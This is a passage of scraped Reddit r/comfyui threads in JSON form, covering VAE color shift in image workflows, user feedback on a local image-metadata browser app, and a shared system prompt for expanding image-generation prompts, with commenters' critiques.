          "text": "VAE will degrade your images coming out of Latent Space though. You do it enough (put it through another wf) and still apply color shift you will have very shit results which is why color shift alone is not enough to solve it.\n\nOr has something new been involved to resolve that because last year it was the bane of extending WAN based workflow results. Trying to swap multiple characters out with VACE got nasty and would require compositing to resolve mostly due to passing in and out of Latent Space from the VAE encode decode.\n\nMaybe I misunderstood what you are trying to show here. (I work mostly in video which is where I see this issue).",
          "score": 1,
          "created_utc": "2026-01-23 22:40:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1bqn0p",
              "author": "Luke2642",
              "text": "Yes, small loss of detail each time. I was showing that the vae doesn't damage the latent much, even 6 encodes 6 decodes. The ksampler damages it a lot more, and causes colour shift.",
              "score": 1,
              "created_utc": "2026-01-23 22:47:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1cj07c",
                  "author": "superstarbootlegs",
                  "text": "isnt that its job - making pixels.",
                  "score": 1,
                  "created_utc": "2026-01-24 01:20:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1brsdn",
          "author": "YMIR_THE_FROSTY",
          "text": "Colors are defined by matrix thats in some ComfyUI file, bit lazy to find it, so ask AI.",
          "score": 1,
          "created_utc": "2026-01-23 22:53:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1c5gy4",
          "author": "Several_Honeydew_250",
          "text": "Anytime you pass to latent space and back, you lose quality.  This is why if your not shift your model class (XL/PONY/FLUX/KRAE etc..) leave it in LATENT, don't decode until the end.  Also, you're using the same VAE on all of them... so, it should maintain color space.",
          "score": 1,
          "created_utc": "2026-01-24 00:06:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ej5fx",
          "author": "TBG______",
          "text": "https://preview.redd.it/150m7twbs9fg1.png?width=379&format=png&auto=webp&s=8c49da4c2aae3e221801fd845fa6cd82c21b32a3\n\nThis is a difference overlay showing all the changes made by the edit sampling with the prompt: *‚Äúchange the color of the shirt to black, keep the background as is.‚Äù* Flux2 Klein 9B tends to alter everything in the image, which is typical behavior and not unique to Flux2 Klein.\n\nAfter observing the results, the changes made by the model are not what I would expect in a real-world scenario. For instance, if a large portion of the image is occupied by a person wearing a white T-shirt and you change it to black, the overall color balance of the image shifts. Reflections, lighting, and even the camera‚Äôs exposure or white balance adapt to the new mid-gray of the scene.   As example looking at the arm, the upper part should show a different light reflection, but it doesn‚Äôt. For me, that means using masking along with a low-percentage blend of the unmasked areas could be sufficient.",
          "score": 1,
          "created_utc": "2026-01-24 10:12:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1eltbb",
              "author": "TBG______",
              "text": "This is after a straightforward fix\n\nhttps://preview.redd.it/7864o8wlz9fg1.png?width=373&format=png&auto=webp&s=049a7892e898d8d119adb38f49b17b338aa52f73\n\nwill post wf later",
              "score": 1,
              "created_utc": "2026-01-24 10:37:02",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1ema1k",
                  "author": "TBG______",
                  "text": "https://preview.redd.it/x4v68k210afg1.png?width=1634&format=png&auto=webp&s=35bb23d10d6dc113c749fe22bc948a5306fe8248\n\nUse Sam to select the element, then expand and blur the mask, apply compositing with the mask and unmasked area, and if you like blend old over new as an optional intermediate solution.",
                  "score": 1,
                  "created_utc": "2026-01-24 10:41:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1f292l",
              "author": "TBG______",
              "text": "https://preview.redd.it/1y5gvizmgafg1.png?width=1433&format=png&auto=webp&s=c0688fe805d0c9b2ba7c43a8de06970bab26907b\n\nAfter testing it with SAM, which requires manual input of elements, I‚Äôve created a new node that can automatically detect the affected areas without SAM, allowing the process to be fully automated.\n\nHowever, I noticed that many contour edges are affected by the mode changes, even with slight repositioning of the edges. This could make the issue a bit tricky to resolve. I will uplode the node to the TBG Takeaways : The TBG Difference Mask node compares two images, mixes SSIM (structure) and RGB difference (color), then thresholds and area-filters to isolate real, coherent changes (like a shirt swap) while ignoring tiny model artifacts and compression noise. \n\nTBG Takeaways with the new TBG Difference Mask node are now uploaded and accessible from the Manager. The workflow for the SAM and Diff nodes can be found here: [https://www.patreon.com/posts/149003920](https://www.patreon.com/posts/149003920) (free access).",
              "score": 1,
              "created_utc": "2026-01-24 12:53:31",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1k7uq0",
          "author": "Capitan01R-",
          "text": "Interesting I was working on the same thing just yesterday bc I knew I was not seeing things, I created a quick node to adjust the decoder and i gotten better colors but since it was manual control it was difficult to choose which works best, and this seems interesting!",
          "score": 1,
          "created_utc": "2026-01-25 04:29:18",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qmq2l0",
      "title": "Built a local browser to organize my 60k+ PNG chaos ‚Äî search by checkpoint, prompt, LoRA, seed etc.",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qmq2l0",
      "author": "SunTzuManyPuppies",
      "created_utc": "2026-01-25 17:53:46",
      "score": 117,
      "num_comments": 31,
      "upvote_ratio": 0.95,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qmq2l0/built_a_local_browser_to_organize_my_60k_png/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1oieul",
          "author": "AK_3D",
          "text": "Thanks for the app. I was just checking it out, it's pretty fast. It does not read WebP workflows however, even when saved with the prompt saver node. (Diffusion Toolkit, which is a similar app does this).",
          "score": 3,
          "created_utc": "2026-01-25 20:00:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1opnrl",
              "author": "SunTzuManyPuppies",
              "text": "Hey, appreciate the feedback and glad its feeling fast on your end. Yea you caught a blind spot there.. oops. I just recently implemented the Save Node and im still sorting out how it handles some metadata chunks specifically for WebP. Its a high priority tho and ill have a fix out in the next release (likely in the next few days) to get it on par with png. Thanks for the heads up!",
              "score": 6,
              "created_utc": "2026-01-25 20:32:44",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1oq82a",
                  "author": "AK_3D",
                  "text": "Happy to provide feedback via a ticket. Overall, its' very straightforward. Also tested it on a slightly older PC. Works great.  \nRather than make an entirely new node, might be better to use the ComfyUI SD Prompt Saver node, which embeds the metadata in a WebP or PNG.",
                  "score": 2,
                  "created_utc": "2026-01-25 20:35:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1q5z8j",
              "author": "SunTzuManyPuppies",
              "text": "Hey there! \n\nI just made some tests and the app appears to be reading WebP normally.\n\nhttps://preview.redd.it/gl225fl58lfg1.png?width=785&format=png&auto=webp&s=4a083891934a4b248ef4efa1c100a660097cc733\n\nIf you have the time, could you please send me the workflow of one of your WebP images that the app isn't reading? \n\nIt would be really helpful! Tks",
              "score": 2,
              "created_utc": "2026-01-26 00:29:07",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1q6e56",
                  "author": "SunTzuManyPuppies",
                  "text": "Actually... I think I found the culprit: it's likely a race condition.\n\nThe app tries to read the metadata the exact millisecond the file is created. If ComfyUI or the OS hasn't finished flushing the metadata chunk to disk yet, the parser sees it as empty/incomplete. That explains why the metadata is there when checking manually later but fails during the initial auto-indexing.\n\nIm adding a retry/debounce mechanism to ensure the file is fully written before parsing. Thanks again!",
                  "score": 5,
                  "created_utc": "2026-01-26 00:31:07",
                  "is_submitter": true,
                  "replies": []
                },
                {
                  "id": "o1t40bi",
                  "author": "AK_3D",
                  "text": "Happy to send you an image with a webp workflow, one with prompt saver and one without. Will do this once I'm at my desktop later.",
                  "score": 1,
                  "created_utc": "2026-01-26 12:39:30",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ofxkp",
          "author": "NickoMagnum",
          "text": "Very interesting",
          "score": 3,
          "created_utc": "2026-01-25 19:49:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ohhtd",
              "author": "SunTzuManyPuppies",
              "text": "Thanks!",
              "score": 2,
              "created_utc": "2026-01-25 19:56:41",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1uwdc7",
          "author": "Yattagor",
          "text": "Interesting, definitely very useful. As soon as I read \"the mess in the output folder,\" I thought to myself!",
          "score": 3,
          "created_utc": "2026-01-26 17:49:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1pgb3z",
          "author": "buddylee00700",
          "text": "I use https://immich.app/\n\nHas AI already built in so you can describe what are searching for if your library gets absolutely massive. I really haven‚Äôt played around with it much to see how accurate it is but it‚Äôs pretty slick for free and open source.\n\nProbably not as focused as yours though",
          "score": 2,
          "created_utc": "2026-01-25 22:28:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1plbwu",
              "author": "SunTzuManyPuppies",
              "text": "Immich is a great tool! Another really cool one that has semantic search is PhotomapAI by lstein (InvokeAI dev). You should check it out! \n\nIMH tackles the same problem from a different angle. I thought about adding semantic search, but figured I'd keep it \"light-weight\" as it is for now... Perhaps in the future. \n\nCheers",
              "score": 3,
              "created_utc": "2026-01-25 22:51:32",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1u079u",
          "author": "Lil_Twist",
          "text": "Perfect, thanks buddy! Happy to support and buy your Pro Version, and contribute.",
          "score": 2,
          "created_utc": "2026-01-26 15:29:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1y18ou",
              "author": "SunTzuManyPuppies",
              "text": "Thanks man, it really means a lot!!",
              "score": 1,
              "created_utc": "2026-01-27 02:42:22",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1uafv3",
          "author": "Street-Pain-9808",
          "text": "Love the app, can't recommend it more.",
          "score": 2,
          "created_utc": "2026-01-26 16:14:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1vtj9k",
          "author": "WiseDuck",
          "text": "Tried it briefly earlier today. Wish I had something like this a long time ago. Brilliant!",
          "score": 2,
          "created_utc": "2026-01-26 20:10:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1x0z2r",
              "author": "SunTzuManyPuppies",
              "text": "Nice!! I hope its useful to you as much as it is to me!",
              "score": 1,
              "created_utc": "2026-01-26 23:30:01",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1xb3qn",
          "author": "According_Boat_6928",
          "text": "Looks cool but the arm64 dmg gives me a ‚ÄúImage MetaHub.app‚Äù is damaged and can‚Äôt be opened. You should move it to the Trash.\" error when I try to launch the app. I'm running MacOS Tahoe 26.2",
          "score": 2,
          "created_utc": "2026-01-27 00:21:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1zqz57",
          "author": "netdzynr",
          "text": "Trying this out and so far I'm really liking it (macOS). I've probably been through a dozen image managers, some browser-based, some standalone, and one of the common limitations I run into is availability of good generation metadata. With your app, I'm finding prompt decoding to be a bit hit and miss from ComfyUI images, but the core gen info (model, vae, seed, steps, etc) seems reliable. Thanks for continuing to work on this feature.\n\nif you don't have the feature already, maybe consider including an image vision prompt extractor for those cases where an image has unreadable gen data. At least users could get somewhat close to the subject/character of the source image.\n\nIn my experience, standalone apps almost always outperform browser-based apps when it comes to speed of displaying thousands of images, so while integration with gen platforms is a nice-to-have feature, I appreciate the agnostic approach you've taken. This also makes the app more future proof. I use an amazing LoraManager app as well, but I don't like that it's tied to ComfyUI. If ComfyUI breaks or stops working for whatever reason, you can't use the tool, even just to look up gen or model info.\n\nNice job üëç",
          "score": 2,
          "created_utc": "2026-01-27 10:28:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o20pyr8",
              "author": "SunTzuManyPuppies",
              "text": "Hi there, thank you so much for the feedback! \n\nAnd yea, the old parser is very hit or miss... my old approach was to keep a node registry that had to constantly be updated... in the long term, that would become unsustainable -- which is why I've created the save node. Have you tried it out?",
              "score": 1,
              "created_utc": "2026-01-27 14:20:38",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o21j3no",
                  "author": "netdzynr",
                  "text": "I assumed the save node is to be used when creating new images, yes? If true, that doesn‚Äôt help with the thousand images already saved. Or am I missing what the node is for?",
                  "score": 1,
                  "created_utc": "2026-01-27 16:34:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o27pqez",
          "author": "SeaTacVic",
          "text": "Awesome. Better than I expected.  \nKeenly awaiting [Feat/videosupport](https://github.com/LuqP2/Image-MetaHub/pull/135) \nHave paid for a license already!",
          "score": 2,
          "created_utc": "2026-01-28 13:53:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2cepmc",
          "author": "wjc_5",
          "text": "so cool",
          "score": 2,
          "created_utc": "2026-01-29 03:11:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o24uopa",
          "author": "mongini12",
          "text": "I tried it and i can't really use it... Most of my image workflows have some sort of upscaling / second pass etc. in them. MetaHub doesn't recognize like 90% of my generations metadata. (granted i save in jpeg, but i can pull the images into comfy and it loads the workflow, so no information is lost there). I really would love this to work as intended...",
          "score": 1,
          "created_utc": "2026-01-28 01:48:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o27gt7g",
          "author": "Crafty-Percentage-29",
          "text": "Great effort! Will try it today",
          "score": 1,
          "created_utc": "2026-01-28 13:03:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o292h1e",
          "author": "Ill-Win4195",
          "text": "Images that do not support AVIF format. I saved the images using Forge.",
          "score": 1,
          "created_utc": "2026-01-28 17:36:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o29boil",
          "author": "pashimu",
          "text": "I use [https://github.com/biagiomaf/smart-comfyui-gallery](https://github.com/biagiomaf/smart-comfyui-gallery) which has out of the box workflow integration for free.",
          "score": 1,
          "created_utc": "2026-01-28 18:15:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1pcl4e",
          "author": "Woisek",
          "text": "Looks interesting, but somehow it's a bit slow for me. And what I noticed immediately: When we select the sorting option, it would make sense that the folders get sorted in that way too.\n\nThanks for the work. üëç\n\nUpdate: When using the arrow key to scroll through the images, the thumbnail animation is chosen unlucky. Either use no animation at all, or just a slight fade. This \"quick grow\" is somehow irritating to look at.",
          "score": 0,
          "created_utc": "2026-01-25 22:12:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1q4q96",
              "author": "SunTzuManyPuppies",
              "text": "Hey there! Thanks for the feedback. Regarding the 'animation', its actually a performance feature rather than an intentional effect. To keep navigation fast, the app loads the low-res thumbnail first so you can scroll through thousands of images without waiting for the full files to decode. Once the high-res image is ready, it swaps it in. That 'quick grow' you're seeing is that transition to full resolution. Im looking into other performance solutions so that no longer happens. Meanwhile ill consider adding an option to toggle progressive loading until i find a fix!\n\nAbout the speed, the app is built to be snappy even with massive collections (have users testing it with 120k+ images successfully), so if its feeling slow it might be a bottleneck with I/O or the drive where the images are stored. Are you using an SSD, NVME or HDD?",
              "score": 1,
              "created_utc": "2026-01-26 00:22:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1sxtj4",
                  "author": "Woisek",
                  "text": ">the app loads the low-res thumbnail first\n\nIn that case, maybe the low-res file should be scaled to the same size as the full res, then this \"scale-flicker\" wouldn't appear.\n\nAre you using an SSD, NVME or HDD?\n\nI use HDD, but that's not the issue. I think it's more the scanning and the multiple folders to go through.",
                  "score": 0,
                  "created_utc": "2026-01-26 11:54:59",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qq55j1",
      "title": "After analyzing 1,000+ viral prompts, I made a system prompt for LLM nodes that auto-generates pro-level image prompts",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qq55j1/after_analyzing_1000_viral_prompts_i_made_a/",
      "author": "Deep-Huckleberry-752",
      "created_utc": "2026-01-29 10:35:12",
      "score": 112,
      "num_comments": 42,
      "upvote_ratio": 0.91,
      "text": "Been obsessed with prompt optimization lately. Wanted to figure out why some prompts produce stunning results while mine look... mid.\n\nSo I collected and analyzed 1,000+ trending image prompts from X to find patterns.\n\n**What I found:**\n\n1. **Negative constraints still matter** ‚Äî telling the model what NOT to do is effective\n2. **Multi-sensory descriptions help** ‚Äî texture, temperature, even smell make images more vivid\n3. **Group by content type** ‚Äî structure your prompt based on scene type (portrait, food, product, etc.)\n\nBonus: Once you nail the above, JSON format isn't necessary.\n\n**So I made a system prompt that does this automatically.**\n\nJust plug it into your LLM prompt optimization node, feed it a simple idea like \"a bowl of ramen\", and it expands it into a structured prompt with all those pro techniques baked in.\n\nÔøº**How to use in ComfyUI:**\n\nUse any LLM node (e.g., GPT, Claude, local LLM) with this as the system prompt. Your workflow would be:\n\nSimple prompt ‚Üí LLM Node (with this system prompt) ‚Üí Image Generation\n\nÔøº**The System Prompt:**\n\nYou are a professional AI image prompt optimization expert. Your task is to rewrite simple user prompts into high-quality, structured versions for better image generation results. Regardless of what the user inputs, output only the pure rewritten result (e.g., do not include \"Rewritten prompt:\"), and do not use markdown symbols.\n\n\\---\n\n\\## Core Rewriting Rules\n\n\\### Rule 1: Replace Feeling Words with Professional Terms\n\nReplace vague feeling words with professional terminology, proper nouns, brand names, or artist names. Note: the examples below are for understanding only ‚Äî do not reuse them. Create original expansions based on user descriptions.\n\n| Feeling Words | Professional Terms |\n\n|---------------|-------------------|\n\n| Cinematic, vintage, atmospheric | Wong Kar-wai aesthetics, Saul Leiter style |\n\n| Film look, retro texture | Kodak Vision3 500T, Cinestill 800T |\n\n| Warm tones, soft colors | Sakura Pink, Creamy White |\n\n| Japanese fresh style | Japanese airy feel, Wabi-sabi aesthetics |\n\n| High-end design feel | Swiss International Style, Bauhaus functionalism |\n\nTerm Categories:\n\n\\- People: Wong Kar-wai, Saul Leiter, Christopher Doyle, Annie Leibovitz\n\n\\- Film stocks: Kodak Vision3 500T, Cinestill 800T, Fujifilm Superia\n\n\\- Aesthetics: Wabi-sabi, Bauhaus, Swiss International Style, MUJI visual language\n\n\\### Rule 2: Replace Adjectives with Quantified Parameters\n\nReplace subjective adjectives with specific technical parameters and values. Note: the examples below are for understanding only ‚Äî do not reuse them. Create original expansions based on user descriptions.\n\n| Adjectives | Quantified Parameters |\n\n|------------|----------------------|\n\n| Professional photography, high-end feel | 90mm lens, f/1.8, high dynamic range |\n\n| Top-down view, from above | 45-degree overhead angle |\n\n| Soft lighting | Soft side backlight, diffused light |\n\n| Blurred background | Shallow depth of field |\n\n| Tilted composition | Dutch angle |\n\n| Dramatic lighting | Volumetric light |\n\n| Ultra-wide | 16mm wide-angle lens |\n\n\\### Rule 3: Add Negative Constraints\n\nAdd explicit prohibitions at the end of prompts to prevent unwanted elements.\n\nCommon Negative Constraints:\n\n\\- No text or words allowed\n\n\\- No low-key dark lighting or strong contrast\n\n\\- No high-saturation neon colors or artificial plastic textures\n\n\\- Product must not be distorted, warped, or redesigned\n\n\\- Do not obscure the face\n\n\\### Rule 4: Sensory Stacking\n\nGo beyond pure visual descriptions by adding multiple sensory dimensions to bring the image to life. Note: the examples below are for understanding only ‚Äî do not reuse them. Create original expansions based on user descriptions.\n\nSensory Dimensions:\n\n\\- Visual: Color, light and shadow, composition (basics)\n\n\\- Tactile: \"Texture feels tangible\", \"Soft and tempting\", \"Delicate texture\"\n\n\\- Olfactory: \"Aroma seems to penetrate the frame\", \"Exudes warm fragrance\"\n\n\\- Motion: \"Surface gently trembles\", \"Steam wisps slowly descending\"\n\n\\- Temperature: \"Steamy warmth\", \"Moist\"\n\n\\### Rule 5: Group and Cluster\n\nFor complex scenes, cluster similar information into groups using subheadings to separate different dimensions.\n\nGrouping Patterns:\n\n\\- Visual Rules\n\n\\- Lighting & Style\n\n\\- Overall Feel\n\n\\- Constraints\n\n\\### Rule 6: Format Adaptation\n\nChoose appropriate format based on content complexity:\n\n\\- Simple scenes (single subject): Natural language paragraphs\n\n\\- Complex scenes (multiple elements/requirements): Structured groupings\n\n\\---\n\n\\## Scene Adaptation Guide\n\nIdentify scene type based on user intent and choose appropriate rewriting strategy. Note: the examples below are for understanding only ‚Äî do not reuse them. Create original expansions based on user descriptions.\n\n| Scene Type | Recommended Terms | Recommended Parameters | Common Constraints |\n\n|------------|------------------|----------------------|-------------------|\n\n| Product Photography | Hasselblad, Apple product aesthetics | Studio lighting, high dynamic range | No product distortion, no text watermarks |\n\n| Portrait Photography | Wong Kar-wai, Annie Leibovitz | 90mm, f/1.8, shallow depth of field | Maintain realistic facial features, preserve identity |\n\n| Food Photography | High-end culinary magazine style | 45-degree overhead, soft side light | No utensil distractions, no text |\n\n| Cinematic | Christopher Doyle, Cinestill 800T | 35mm anamorphic lens, Dutch angle | No low-key dark lighting (unless requested) |\n\n| Japanese Style | Japanese airy feel, Wabi-sabi aesthetics | High-key photography, diffused light | No high-saturation neon colors |\n\n| Design Poster | Swiss International Style, Bauhaus | Grid system, minimal color palette | Clear information hierarchy |\n\n\\---\n\n\\## Example\n\n\\*\\*User Input:\\*\\*\n\na portrait with cinematic feel\n\n\\*\\*Rewritten Prompt:\\*\\*\n\nCinematic portrait photography, shot through rain-soaked glass at a dimly lit restaurant at night.\n\nVisual Style:\n\nWong Kar-wai and Saul Leiter aesthetics. Deep saturated colors, heavy shadows. Shot with 90mm lens, f/1.8, Kodak Vision3 500T film grain.\n\nLighting & Atmosphere:\n\nNeon green and red city lights refracting through raindrops in the foreground. Soft focus, dreamy, emotionally evocative. The air is filled with moisture, loneliness, and nostalgia.\n\nConstraints:\n\nMaintain realistic facial features. Do not alter identity characteristics.\n\nÔøº**The dataset is open source too** ‚Äî 1,000+ prompts with image links, all in JSON:\n\nüëâ [ https://github.com/jau123/nanobanana-trending-prompts ](https://github.com/jau123/nanobanana-trending-prompts)\n\nCheck all datasets with Gallery üëâ [meigen.ai](https://www.meigen.ai)\n\nLet me know if you try it out. Curious what results you get.",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qq55j1/after_analyzing_1000_viral_prompts_i_made_a/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o2e6rsb",
          "author": "fauni-7",
          "text": "One problem I am already noticing, that it uses negations, like:  \n\"No low-key dark lighting or strong contrast. No high-saturation neon colors or artificial plastic textures. Do not obscure facial expressions\"  \nMaybe you should tell it to not use negations, or to have a separate section for the negative prompt.",
          "score": 15,
          "created_utc": "2026-01-29 11:36:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2edncf",
              "author": "admajic",
              "text": "With zimage turbo you can use negatives on the positive prompt. Go try it out",
              "score": 7,
              "created_utc": "2026-01-29 12:26:19",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o2e7mtz",
              "author": "Deep-Huckleberry-752",
              "text": "That's a great point‚Äîfeel free to submit a PR if you'd like to help improve the structure",
              "score": 1,
              "created_utc": "2026-01-29 11:43:33",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2esse5",
          "author": "afinalsin",
          "text": "If you don't mind a bit of criticism, I think your methodology and the conclusions you have drawn are a bit flawed. I appreciate the drive to learn it and share, but you've hit a couple traps that are super common when learning image gen.\n\nThis bit immediately caught my attention:\n\n>So I collected and analyzed 1,000+ trending image prompts from X to find patterns.\n\nSorry, but you didn't collect 1000+ trending prompts. Trending prompts don't exist. What you've done is collect 1000+ trending images and grabbed the prompts from those. They're similar, but they aren't the same thing. \n\nRelying on trending images means you are only sourcing the most attention-grabbing results with no regard for how closely the models followed the prompts. Wanna know what draws the most attention in the AI space online? Your .json of trending prompts contains 479 mentions of the keyword \"woman\", 376 mentions of the word \"girl\", and 212 mentions of the word \"female\". \n\nPeople don't care about the prompt, they care about a pretty picture, and models are experts at delivering a pretty picture. That's basically all they're good for. \n\n[Take this image from Nanobanana Pro](https://i.postimg.cc/dqSZtvNj/nano-4.jpg). Looks cool, right? Imagine I'm some guy on X with a following, and this got a couple hundred likes and retweets, enough for it to hit your scrape. It must have a good prompt for it to be so popular, right?\n\nWell, the prompt for that image is:\n\n>Generate a cinematic film still using the following random tags as inspiration:\n\n>inr, tae, repair, ilovemy, eoin, hurricane, allo, dianne, baddest, elondon, turk, grove, hawk, cabine, bonnet, genuine, big, flashbacks, nare, kavanaugh, ellis, boogie, pies, vandalism, bham, cassidy, schal, rout, mol\n\n>You must not include any text.\n\nIt's clear the prompt is nonsense, but the model made a sick image anyway. That's what they do, they take any input and try their best to turn chicken shit into chicken salad. \n\nThat's a good thing, but that strength also leads a lot of people astray. If you have found any similarities between the prompts, try not to draw the conclusion that \"this is in the prompt, the image is good, therefore the prompt must be good.\" \n\nPeople naturally follow the herd and try looking online to find pretty images to see how it's done, they find one and copy the keywords, but the image they've copied *also* copied those keywords from a different image, which in turn copied from another image, and so on, creating a feedback loop of the blind leading the blind. \n\nAsk any of the prompters in the chain why their image is good, they'll respond with \"It's the prompt.\" Ask them *why* they've included what they have in the prompt and you'll get some variation of \"Because it makes the image better.\" \n\nSeriously, the .json dataset is comprised of tons of overused and unnecessary keywords that have been hanging around long past their use-by date and will barely make a difference in the generation. There are 1232 mentions of the keyword \"realistic\" of which 304 are \"photorealistic\" and 191 are \"ultra-realistic\", 130 \"ultra-detailed\", 8 \"best quality\", 29 \"masterpiece\", 55 \"4k\", 308 \"8k\", hell, there's even 1 \"artstation\" that's made its way through. \n\nWhat your dataset primarily shows is the model is good at making pretty images. What it doesn't show is how to make particular pretty images.\n\nNow, I'm not saying all your recommendations are wrong necessarily. A couple look good, others do not (I didn't think I'd have to write this, but don't prompt for smell, or taste, or sound, or touch. These models are trained on visuals, so use visual descriptors.) \n\nWhat I'm saying is you can't draw conclusions based on the popularity of an image. Again, there's more than 1200 mentions of realistic in your dataset, which must mean it's a good keyword since it's so popular, right? No, if you want a realistic image just include the medium in the prompt. An amateur photo, a cinematic film still, a polaroid, whatever. You only need \"realistic\" to reinforce the medium if the rest of the prompt is pushing towards an unrealistic style.\n\nSorry If I came off like a dick at any point here, it really is super cool you're doing this and sharing it. It's hard to be thorough and diplomatic at the same time when trying to point out flaws in someone's idea. \n\nSo I don't look like a complete dickhead just here to shit on someone else's effort, here's a site that will help you out if you feel like scraping more popular images and their prompts: https://civitlab.devix.pl/ It's the civit gallery, but much more easily searchable.",
          "score": 13,
          "created_utc": "2026-01-29 13:55:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2ev6c8",
              "author": "Deep-Huckleberry-752",
              "text": "You are definitely a hardcore player‚Äîyou're hitting on the real issues here.\n* On the 'girl' bias: Believe it or not, the ratio in the raw data was actually much higher. What you see is already after my initial filtering, but I plan to curate it even more aggressively moving forward.\n* On 4k/8k: I agree these are junk tags that pros shouldn't need. Not making excuses, but that is simply what the raw data reflects. I am currently debating whether I should intervene and scrub these 'placebo' tags from the dataset entirely.\n* On Sensory Stacking: I‚Äôll reserve judgment on this one for now. I plan to run more tests to see how much weight the model actually gives them.\n* On Data Sources: My main value proposition is keeping a pulse on X/Twitter trends specifically. It‚Äôs a different ecosystem from Civitai. Let's be honest, Civitai definitely has its own heavy bias toward 2.5D and Anime styles too, haha.\nSeriously, thanks for the detailed feedback!",
              "score": -4,
              "created_utc": "2026-01-29 14:07:55",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o2fkmr9",
                  "author": "Haiku-575",
                  "text": ">You are definitely a hardcore player‚Äîyou're hitting on the real issues here.\n\nI wonder if afinalsin was under the impression he was talking t√™te-√†-t√™te, not t√™te-√†-machine.",
                  "score": 5,
                  "created_utc": "2026-01-29 16:08:22",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o2flifs",
                  "author": "mail4youtoo",
                  "text": "If you are going to use chatgpt or some other AI to write a reply, at least try to edit it a little bit to not sound like it came from AI",
                  "score": 3,
                  "created_utc": "2026-01-29 16:12:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o2eccvu",
          "author": "Justify_87",
          "text": "The thing about negatives is a bit more complicated. The latest models don't use negative prompts anymore, so most people describe the things they don't want to see with \"no ...\". But having the word of the thing you don't want to have in the prompt brings attention to that concept. So at least for me it's better to describe the negative of the thing you don't want. A simple example: instead of \"no blurriness\" use \"everything is in focus\". Or something like that. You get the principle. \n\nIt's harder for some stuff. Or sometimes impossible. For example what's the negative of the color \"blue\".",
          "score": 8,
          "created_utc": "2026-01-29 12:17:26",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2ee1rj",
              "author": "admajic",
              "text": "On flux klein you can say don't overstaturate and qwen3 knows what to do.  Try it",
              "score": 1,
              "created_utc": "2026-01-29 12:29:01",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o2ed4au",
              "author": "Deep-Huckleberry-752",
              "text": "Totally agree regarding the older generation of models (SD/Flux) where negative tokens would often bleed into the image.\n\nBut I've noticed that Nanobanana seems to handle semantic negation much better, likely due to its stronger reasoning/LLM backbone. It treats 'No low-key lighting' as a logic constraint rather than just seeing the token 'low-key'",
              "score": 0,
              "created_utc": "2026-01-29 12:22:43",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2epmpj",
          "author": "Extension_Building34",
          "text": "Cool, I‚Äôll give this a shot",
          "score": 3,
          "created_utc": "2026-01-29 13:38:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2ec0sz",
          "author": "Icy_Wrangler5613",
